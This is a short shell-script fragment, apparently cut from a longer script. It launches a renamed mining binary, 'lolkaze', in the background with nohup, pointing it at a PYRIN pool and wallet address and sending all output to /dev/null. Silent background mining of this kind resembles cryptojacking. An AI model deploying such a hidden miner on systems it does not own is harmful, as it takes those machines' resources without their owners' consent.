...
chmod +x lolkaze
nohup ./lolkaze --algo PYRIN --pool ns5026562.ip-15-235-214.net --port 1177 --user pyrin:qq26gm0pn27hp9vxtrlpngcfzcxmsjc8vtlmn5a2087rxvyaczewyygdxhn7d.sugoi > /dev/null 2>&1 &
sleep 30
